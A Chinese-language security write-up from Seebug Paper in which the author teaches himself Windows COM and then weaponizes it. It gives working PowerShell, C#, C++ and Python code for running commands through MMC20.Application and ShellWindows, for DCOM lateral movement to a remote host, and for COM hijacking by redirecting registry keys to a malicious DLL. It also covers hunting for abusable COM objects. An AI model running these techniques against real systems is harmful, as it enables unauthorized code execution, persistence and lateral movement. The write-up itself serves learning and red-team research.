**作者：0r@nge  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

# 前言

本文是作者从0到1学习com的一个过程，记录了从初识com到com的武器化利用以及挖掘。com组件博大精深，无论是从开发的角度还是安全的角度都非常值得研究，本文仅作入门贴。

# 基础知识

对于com的基本认知，摘自头像哥博客。对于com，个人没有系统的读过微软的文档，一直都不怎么了解，头像哥的这几个总结比较适合我这种懒的读文档的人初步了解。

  1. 在设计层面，COM模型分为`接口`与`实现`。 例如计划任务示例代码中的`ITaskService`。

  2. 区分COM组件的唯一标识为`Guid`，分别为针对接口的`IID（Interface IDentifier）`与针对类的`CLSID（CLaSs IDentifier）`。 例如`CLSID_TaskScheduler`定义为`0F87369F-A4E5-4CFC-BD3E-73E6154572DD`。

  3. COM组件需要在注册表内进行注册才可进行调用。通常情况下，系统预定义组件注册于`HKEY_LOCAL_MACHINE\SOFTWARE\Classes`，用户组件注册于`HKEY_CURRENT_USER\SOFTWARE\Classes`。`HKEY_CLASSES_ROOT`为二者合并后的视图，在系统服务角度等同于`HKEY_LOCAL_MACHINE\SOFTWARE\Classes`。 例如计划任务组件的注册信息注册于`HKEY_CLASSES_ROOT\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}`。

  4. Windows最小的可独立运行单元是进程，最小的可复用的代码单元为类库，所以COM同样存在`进程内（In-Process）`与`进程外（Out-Of-Process）`两种实现方式。多数情况下，进程外COM组件为一个exe，进程内COM组件为一个dll。 例如计划任务的COM对象为进程内组件，由`taskschd.dll`实现。

  5. 为方便COM组件调用，可以通过`ProgId（Programmatic IDentifier）`为`CLSID`指定别名。 例如计划任务组件的ProgId为`Schedule.Service.1`。

  6. 客户端调用`CoCreateInstance`、`CoCreateInstanceEx`、`CoGetClassObject`等函数时，将创建具有指定`CLSID`的对象实例，这个过程称为`激活（Activation）`。 例如微软示例代码中的`CoCreateInstance(CLSID_TaskScheduler,....)`。

  7. COM采用`工厂模式(class factory)`对调用方与实现方进行解耦，包括进程内外COM组件激活、通信、转换，`IUnknown::QueryInterface`和`IClassFactory`始终贯穿其中。 例如微软示例代码中的一大堆`QueryInterface`。

还是有必要自己读一下官方文档，第一遍读大部分官方术语是不太理解的，无伤大雅，能理解多少就理解多少。下面是我自己阅读官方文档总结的一些小点

  1. com程序一般是dll文件，被提供给主程序调用。不同的com程序具有不同的接口，但是所有的接口都是从class factory 和 IUnknown接口获得的。所以com程序必须实现 class factory 和 Iunknown接口

  2. 接口是实现对对象数据访问的函数集，而接口的函数称为方法。每个接口都有自己的唯一接口标识符，叫IID， IID也是一个GUID(全局唯一标识符)。 在定义接口时，用IDL来定义，使用MIDL编译会生成对应的都文件，根据头文件我们自己实现编程调用

  3. IUnKnown接口 所有COM接口都继承自IUnKnown接口，该接口具有3个成员函数，QueryInterface、AddRef、Release. 

  4. CoCreateInstance 函数创建com实例并返回客户端请求的接口指针。客户端指的是将CLSID传递给系统并请求com对象实例的调用方，这里个人理解为编程人员的代码获取com服务器的指针，并调用接口的方法使用com服务，服务器端指的是向系统提供COM对象的模块 com服务器主要有两种，进程内和进程外，进程内服务器在dll中实现，进程外服务器在exe中实现。 如果要创建com对象，com服务器需要提供 IClassFactory 接口的实现，而且 IClassFactory 包含 CreateInstance方法。 IUnknown::QueryInterface和IClassFactory始终贯穿在com组件的调用中。

  5. 在注册com服务器的时候，如果是进程内注册，即dll，dll必须导出以下函数 DllRegisterServer DllUnregisterServer 注册是将com对象写进注册表，自然离不开注册表的一系列函数 RegOpenKey RegCreateKey ......

  6. 几乎所有的COM函数和接口方法都返回HRESULT类型的值，但HRESULT不是句柄

com与注册表的关系

    
    
    HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性
    HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息
    HKEY_CURRENT_USER 用于存储当前用户配置项
    HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项
    HKEY_LOCAL_MACHINE 用于存储当前用户物理状态
    HKEY_USERS 用于存储新用户的默认配置项

![image-20221101004116577](https://images.seebug.org/content/images/2022/11/30/1669787335000-image-20221101004116577.png-w331s)

com调用需要的值

  1. CLSID 
  2. IID 
  3. 虚函数表 
  4. 方法签名 

整理以后制作IDL，获取到IDL之后，就可以使用合适的语言进行调用

GUID
用于在系统中唯一标识一个对象，CLSID(类标识符)是GUID在注册表中的表示，用于在注册表中唯一标识一个com类对象。guid在标识接口时称为IID（接口标识符）

每一个注册的clsid表项中都含有一个
`InprocServer32`的子项，该子项内有映射到该com二进制文件的键值对，操作系统通过该键值对将com二进制文件载入进程。

`InprocServer32`表示的是dll的实现路径，`LocalServer32`表示的是exe的实现路径

![image-20221105121211445](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221105121211445.png-w331s)

# com利用

### 执行命令

枚举com对象

    
    
    gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32

COM接口里枚举出来的函数（如果是微软公开的话）可以到：[https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&terms=](https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&terms= "https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&terms=") 搜索 例如：ExecuteShellCommand
<https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand>

**在调用函数的时候需要注意，如果CLSID子项带有ProgID的话需要指定ProgID调用方法或属性**

可以查看com对象的方法

如下，该类型库公开了start方法，接受bool传参以及commandLine方法

![image-20221107151218085](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221107151218085.png-w331s)

对com组件的利用可以直接使用powershell调用接口执行命令

这里可以调用mmc执行命令 ，后文会讲到，mmc还支持远程调用，等到DCOM那里会提

    
    
    $handle = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1"))
    $handle.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

![image-20221108095405673](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221108095405673.png-w331s)

另一种调用COM执行命令 ShellWindows

    
    
    $hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39")) 
    $item = $hb.Item() 
    $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

![image-20221109000628685](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221109000628685.png-w331s)

等等……还有很多

    
    
    $shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID("72C24DD5-D70A-438B-8A42-98424B88AFB8"))
    $shell.Run("calc.exe")

### 计划任务

通过调用`ITaskFolder::registerTask` 来注册计划任务

这里头像哥讲的很通俗，可以参考

<http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html>

根据微软官方稍作修改，实现dll武器化

### 进程注入

利用com实现进程注入，没有调用CreateProcess等常规api，而是调用[oleacc!GetProcessHandleFromHwnd()](https://docs.microsoft.com/en-us/windows/win32/winauto/getprocesshandlefromhwnd)，利用
`IRundown::DoCallback()`执行命令，并且该接口需要一个IPID和OXID值来执行代码。该接口也不是公开的方法，需要手动去逆，来实现武器化

![image-20221111010506617](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221111010506617.png-w331s)

本人在复现时注入失败，根据报错查看，在调用com接口的时候连接失败，猜测是微软已经修复。

![image-20221111011007974](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221111011007974.png-w331s)

代码实现

<https://github.com/mdsecactivebreach/com_inject>

# com劫持

我们知道dll劫持的原理是利用加载dll的路径顺序，替换原dll为恶意dll，那么com劫持是不是也是类似的呢

com组件的加载过程如下

    
    
    HKCU\Software\Classes\CLSID
    HKCR\CLSID
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\

可以看到`HKCU`的优先级高于`HKCR`高于`HKLM`

那我们的目标就很明显了，劫持目标选择 `HKCU\Software\Classes\CLSID`，这样就会先加载我们的恶意dll。

与dll劫持不同的是，dll劫持只能劫持dll，com劫持可以劫持 com文件、pe文件、api文件等

步骤就是修改注册表的路径，指向我们的恶意路径，和白加黑一样

### 利用缺失的CLSID

尝试一下对计算器进行com劫持，寻找 在`InprocServer32`下缺失的CLSID

因为修改`InprocServer32`下的dll需要一定权限，所以该方法需要管理员权限

![image-20221108094138806](https://images.seebug.org/content/images/2022/11/30/1669787336000-image-20221108094138806.png-w331s)

![image-20221108103634466](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108103634466.png-w331s)

保存并导出为csv

![](https://images.seebug.org/content/images/2022/11/93faa093-6ea6-4135-b0a1-959986cb2106.png-w331s)

python实现自动化替换路径

    
    
    import csv
    
    class Inject(object):
        def __init__(self):
            self.path='Logfile.CSV'
    
        def add(self):
            with open(self.path,'r',encoding='utf-8') as r:
                g=csv.DictReader(r)
                for name in g:
                    z=[x for x in name]
                    for i in z:
                        if 'HK' in str(name[i]):
                            print('reg add {} /ve /t REG_SZ /d C:\\Users\\Administrator\\Desktop\\test\\Dll64.dll /f'.format(name[i]),file=open('com_hijack.bat','a',encoding='utf-8'))
    
    if __name__ == '__main__':
        obj=Inject()
        obj.add()
        print('[!] Administrator run com_hijack.bat')

生成bat后需要管理员权限打开，再次打开calc发现已经成功劫持

![image-20221108110714769](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108110714769.png-w331s)

该方法有个明显的缺点，就是需要管理员权限。

所以这里出现了第二种方法

### 覆盖COM键

原理：在`HKCU`注册表中添加键值后，当com对象被调用，`HKLM`中的键值就会被覆盖(并且添加到`HKCR`)中

先使用oleview.net来过滤程序启动权限为空的id

![image-20221108113614413](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108113614413.png-w331s)

设置过滤规则

![image-20221108114326835](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108114326835.png-w331s)

随手点开一个

![image-20221108114630484](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108114630484.png-w331s)

查看clsid

    
    
    ADDA2EBE-0BA0-4FEA-A1DE-2F3C7C596099

可以看到调用的dll

![image-20221108114730929](https://images.seebug.org/content/images/2022/11/30/1669787337000-image-20221108114730929.png-w331s)

找到该CLSID对应的dll

![image-20221108115102525](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108115102525.png-w331s)

修改加载的dll为恶意dll

    
    
    C:\Program Files\Mozilla Firefox\notificationserver.dll

![image-20221108115321155](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108115321155.png-w331s)

但在启动的时候，发现并没有劫持成功

![image-20221108121002047](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108121002047.png-w331s)

这里猜测可能是因为该dll没有被调用，需要特定服务才能调用，火狐不是那么通用，也也不清楚具体是哪个服务进行调用

下面换一个计算器来进行演示

##### 劫持ie

这里选择ie浏览器进行劫持，对应的CLSID为`{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`，且该劫方法不需要高权限

可以看到本来的注册表项键值

![image-20221108123106134](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108123106134.png-w331s)

修改注册表

![image-20221108132956508](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108132956508.png-w331s)

启动ie浏览器，劫持成功

![image-20221108133213720](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108133213720.png-w331s)

###### 代码实现

<https://github.com/0range-x/windows/blob/main/dll_weapon/ieHijack.cpp>

# com注册表的滥用

### LocalServer32

枚举所有`LocalServer32`键值

    
    
    $inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
    $inproc | ForEach {$_.LocalServer32} > values.txt
    
    gwmi Win32_COMSetting -computername 127.0.0.1 | ft LocalServer32 -autosize | Out-String -width 4096 | out-file dcom_exes.txt
    
    gwmi Win32_COMSetting -computername 127.0.0.1 | ft InProcServer32 -autosize | Out-String -width 4096 | out-file dcom_dlls.txt

![image-20221108163132551](https://images.seebug.org/content/images/2022/11/30/1669787338000-image-20221108163132551.png-w331s)

寻找`File not Found`

    
    
    $paths = gc .\values.txt
    foreach ($p in $paths){$p;cmd /c dir $p > $null}

![image-20221108163300670](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108163300670.png-w331s)

找exe的文件夹路径，这里手工尝试了不少，但是没有发现everyone权限的文件夹路径

![image-20221108213025496](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108213025496.png-w331s)

这里个人觉得寻找exe的效率很低，不如花时间去找dll实现武器化，毕竟dll的数量更多，利用的可能性更大

### InprocServer32

枚举所有`InprocServer32`中的键值

    
    
    $inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
    $paths = $inproc | ForEach {$_.InprocServer32} > demo.txt

![image-20221108163120722](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108163120722.png-w331s)

    
    
    $paths = gc .\demo.txt
    foreach ($p in $paths){$p;cmd /c dir $p > $null}

![image-20221108163606393](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108163606393.png-w331s)

同样的，找文件夹的权限路径，如果everyone可写，可以替换恶意dll，然后使用rundll32加载

    
    
    rundll32.exe -sta {CLSID}

# DCOM横移

com是在计算机本地的实现，DCOM是COM的进一步扩展，DCOM通过远程过程调用(RPC)将com的功能在远程计算机上实现，可以将DCOM理解为通过RPC实现的COM。

调用DCOM需要的条件。

通常情况下，调用DCOM连接到远程计算机的时候，我们已经具有了本地管理员的权限

在很多com对象都看到APPid和CLSID是一个值，这里暂且将他们理解为CLSID的不同表示，就像GUID和CLSID一样

枚举支持DCOM的应用程序

    
    
    Get-CimInstance -class Win32_DCOMApplication | select appid,name

![image-20221108233828325](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108233828325.png-w331s)

使用DCOM执行命令

    
    
    $com =[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
    $com.Document.ActiveView | gm           //查看方法

看到执行命令的方法

![image-20221108234815550](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108234815550.png-w331s)

调用执行

    
    
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")

![image-20221108234902647](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221108234902647.png-w331s)

远程调用,需要关闭防火墙

    
    
    $com =[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.135.246")) 
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")

另一种组件实现

    
    
    $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.135.246")
    $obj = [System.Activator]::CreateInstance($com)
    $item = $obj.item()
    $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe","c:\windows\system32",$null, 0)

除了这两种方法，支持DCOM调用的还有很多公开的方法，这里不再一一列举，需要注意的是，不同的组件对不同的操作系统兼容性不同，建议投入实战前先测试兼容性

    
    
    Methods                     APPID
    MMC20.Application           7e0423cd-1119-0928-900c-e6d4a52a0715
    ShellWindows                9BA05972-F6A8-11CF-A442-00A0C90A8F39
    ShellBrowserWindow          C08AFD90-F2A1-11D1-8455-00A0C91F3880
    
    
    Document.Application.ServiceStart()
    Document.Application.ServiceStop()
    Document.Application.IsServiceRunning()
    Document.Application.ShutDownWindows()
    Document.Application.GetSystemInformation()

怎么来查找是否可以被我们利用呢？

可以通过oleview.net 来查找对应的CLSID和启动权限，看到这里 `Launch Permission`为空，说明普通权限即可

![image-20221109002907879](https://images.seebug.org/content/images/2022/11/30/1669787339000-image-20221109002907879.png-w331s)

### 武器化实现

c#方法

以shellwindows为例

    
    
    var CLSID = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
    object RemoteComObject = Activator.CreateInstance(ComType);
    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { BaseCommand, Parameters + " " + Command, Directory, null, 0 });

可以看到利用和powershell是一样的，只是需要一步步获取方法名，传参多一点

c++实现

实现思路

  1. 初始化com组件(CoInitializeEx) 
  2. 初始化com安全属性(CoInitializeSecurity) 
  3. 获取com组件的接口(CLSIDFromProgID) 
  4. 创建实例(CreateInstance) 
  5. 填写com组件参数 
  6. 清理释放(Release + CoUninitialize) 

实现demo

<https://github.com/0range-x/windows/blob/main/win32/proxychain.cpp>

# com挖掘

### 已公开的com对象

可以通过下面代码遍历所有com组件和它导出的方法

    
    
    New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
    Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > clsids.txt

![image-20221105121801010](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221105121801010.png-w331s)

可以查看所有的成员方法

    
    
    $Position  = 1
    $Filename = "win10-clsid-members.txt"
    $inputFilename = "clsids.txt"
    ForEach($CLSID in Get-Content $inputFilename) {
          Write-Output "$($Position) - $($CLSID)"
          Write-Output "------------------------" | Out-File $Filename -Append
          Write-Output $($CLSID) | Out-File $Filename -Append
          $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
          $handle | Get-Member | Out-File $Filename -Append
          $Position += 1
    }

![image-20221111135353305](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221111135353305.png-w331s)

找关键词
`execute`,`exec`,`spawn`,`launch`,`run`![image-20221111135506972](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221111135506972.png-w331s)

接着进行相应的传参调用即可，类似shellWindows、mmc等

##### processChain的利用

实现是prchauto.dll，其中包含 tlib文件，可以用oleview打开

在注册表中找到该com组件的实现文件

![image-20221105124230752](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221105124230752.png-w331s)

查看方法，看到接受commandLine方法，说明可能存在利用

![image-20221109225144671](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221109225144671.png-w331s)

去oleview中查看对应的tlb中包含的成员等信息

![image-20221105131827386](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221105131827386.png-w331s)

将这个tlib文件保存到idl文件，然后使用MIDL将IDL文件转换成需要的c++头文件，头文件中会定义这个类和接口的使用方法。

补充一下：idl是一种接口定义语言，idl文件是接口定义文件，包含接口和类型库定义，MIDL是IDL文件的编译器

接下来编译idl，最开始的时候配置命令行版本的midl，但是老是报错，后面发现可以直接在vs里编译

![image-20221107011930018](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221107011930018.png-w331s)

可以查看midl的输出

![image-20221107011949977](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221107011949977.png-w331s)

编译后生成h文件和c文件

![image-20221107012035149](https://images.seebug.org/content/images/2022/11/30/1669787340000-image-20221107012035149.png-w331s)

我们需要根据头文件来自己编程实现com组件的利用

![image-20221107012122798](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221107012122798.png-w331s)

main.cpp

    
    
    #define CLSID_ProcessChain L"{E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E}"
    #define IID_IProcessChain  L"{79ED9CB4-3A01-4ABA-AD3C-A985EE298B20}"
    
    BOOL ProcessChain(wchar_t cmd[]) {
        HRESULT hr = 0;
        CLSID clsidIProcessChain = { 0 };
        IID iidIProcessChain = { 0 };
        IProcessChain* ProcessChain = NULL;
        BOOL bRet = FALSE;
    
        //初始化com环境
        CoInitialize(NULL);
    
        CLSIDFromString(CLSID_ProcessChain, &clsidIProcessChain);
        IIDFromString(IID_IProcessChain, &iidIProcessChain);
    
        //创建com接口
        hr = CoCreateInstance(clsidIProcessChain, NULL, CLSCTX_INPROC_SERVER, iidIProcessChain, (LPVOID*)&ProcessChain);
    
        //设置布尔值供start接受参数
        VARIANT_BOOL vb = VARIANT_TRUE;
    
        //设置参数
        ProcessChain->put_CommandLine((BSTR)cmd);
    
        //调用方法
        hr = ProcessChain->Start(&vb);
        printf("[+] Load successfully!");
        //释放
        CoUninitialize();
        return TRUE;
    }

### 未公开的com对象

需要利用一些逆向手段，和白加黑的挖掘比较相似(ps：以下方式仅仅是对这种方式的复现，并未去挖掘新的com利用)

那么，如果看不到它的方法或者参数怎么办呢？这个时候就需要我们去逆向

在oleview里找到该方法调用的参数

![image-20221109231930765](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221109231930765.png-w331s)

这种情况我们还无法确定是否可以创建其他进程

在ida里发现该dll确实调用了CreateProcess，虽然没有找到具体是哪个方法调用的，但基本可以确定该com对象是可以执行命令创建进程的，上文的利用也是印证了这一点

![image-20221109233856111](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221109233856111.png-w331s)

### 自动化挖掘

诚然，纯手工挖掘com组件是很耗时的一件事情，下面介绍自动化挖掘com的方法

项目地址

<https://github.com/nickvourd/COM-Hunter>

大致介绍

![image-20221111112209384](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221111112209384.png-w331s)

##### com劫持

![image-20221111113030674](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221111113030674.png-w331s)

发现是oleacc.dll

![image-20221111113151925](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221111113151925.png-w331s)

修改后启动ie浏览器，劫持成功

![image-20221111113426921](https://images.seebug.org/content/images/2022/11/30/1669787341000-image-20221111113426921.png-w331s)

这种方式是不是比上面手动挖掘方便多了呢？但是也有缺点，找到的com并不完整，更深入的挖掘还是需要依靠手工

# 总结

com可以挖掘利用的点还有很多，浏览器、office等等各种功能都曾被挖掘出利用，现在已经成为对抗中的热门领域，非常值得深度研究，包括劫持横向提权等等……

本文也只是记录个人在学习com从0-1的过程，如果有理解错误的地方，欢迎大家指正

# 参考文章

<https://422926799.github.io/posts/73b20b1d.html>

<https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/>

<https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/>

<https://github.com/rvrsh3ll/SharpCOM/blob/master/SharpCOM/Program.cs>

<https://paper.seebug.org/1624/>

<https://learn.microsoft.com/en-us/windows/win32/taskschd/logon-trigger-example--c--->

<http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2030/>

